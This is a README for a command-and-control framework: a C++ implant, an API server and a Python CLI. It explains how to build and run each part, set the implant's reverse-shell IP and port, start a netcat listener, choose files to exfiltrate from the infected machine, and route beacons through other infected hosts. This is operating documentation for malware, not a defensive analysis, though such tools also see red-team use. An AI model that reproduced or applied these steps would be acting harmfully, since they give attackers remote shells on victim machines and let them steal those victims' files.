# Command & Control

## Implant
```bash
cd client
```

### Dependency
You need to install the cpr library:
https://girishjoshi.io/post/using-cpr-for-making-http-requests-c++/ 

Possible issue:
```bash
./bin/prog: error while loading shared libraries: libcpr.so.1: cannot open shared object file: No such file or directory
```
https://stackoverflow.com/questions/480764/linux-error-while-loading-shared-libraries-cannot-open-shared-object-file-no-s

### Compile 
```bash
make
```

### Configuration


### Execution
```bash
make run
```

## Server
```bash
cd api
```

### Setup 
```bash
npm install
chmod +x setup.sh
./setup.sh
```

### Execution
```bash
just
```

## CLI

### Execution
```bash
python3 run.py
```

### How to get a reverse shell
You can configure the implant with the IP and PORT that you want.
Go to client/src/config.hpp:
```cpp
#define RS_IP YOUR_IP
#define RS_PORT YOUR_PORT
```

On your machine, you need to listen for a connection with *nc*
```bash
nc -lvnp RS_IP RS_PORT
```

### How to extract files

First you need to configure the implant, go to client/src/config.hpp
Add to the variable *file_to_extract* the abolute paths of the files you want to get.
```cpp
21: static const std::array<const char*, 1> file_to_extract({"/home/username/exemple"});
``` 

### Routing and Beacon

To take advantage of the routing componant of this C2 you need to configure the implant with all the IP addresses that you want to try to connect in the hope that one of them is infected and connected to internet.  
Go to client/src/config.hpp: Add to the variable *routing* all the IPs
```cpp
19: static const std::array<const char*, NUMBER_OF_IPs> routing({"127.0.0.1"});
```


# Author
Evan Clausse